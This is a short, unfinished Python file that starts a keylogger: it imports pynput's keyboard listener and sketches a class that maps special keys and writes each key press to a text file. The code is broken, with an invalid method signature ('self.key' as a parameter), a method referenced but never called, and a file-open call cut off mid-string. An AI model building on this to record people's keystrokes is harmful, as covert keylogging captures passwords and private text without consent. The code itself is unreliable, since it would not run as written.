import pynput
from pynput.keyboard import Key, Listener

class Keypresses:

    # Creaiing a map for all keys

    def clean(self):
        if self.letter == 'Key.backspace':
            self.letter = '[BACKSPACE]'
        elif self.letter == 'Key.num_lock':
            self.letter = '[NUMLOCK]'


    # Write to a text file on each keyboard press
    def on_press(self.key):

        self.letter = str(key).replace("'", "")

        self.clean

        file = open ('keypresses.')
    